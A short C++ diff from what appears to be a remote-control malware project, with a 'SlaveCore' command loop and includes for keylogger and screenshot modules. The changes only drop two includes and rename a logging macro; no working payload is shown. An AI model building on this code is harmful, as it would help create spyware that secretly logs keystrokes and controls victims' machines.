@@ -14,8 +14,6 @@ using namespace Blaspheme;
 #include <malicious/Keylogger.hpp>
 #include <malicious/Screenshot.hpp>
 
-#include "CommandDispatcher.hpp"
-#include "ProgramStart.hpp"
 #include "RemoteControlFunctions.hpp"
 #include "SlaveCore.hpp"
 
@@ -132,7 +130,7 @@ namespace Inhibition
 
     bool SlaveCore::process_command()
     {
-		LOG_THIS_FUNCTION
+		TRACE_FUNCTION
 		std::string buffer_cmd;
         LOG << "Waiting command";
         session >> buffer_cmd;
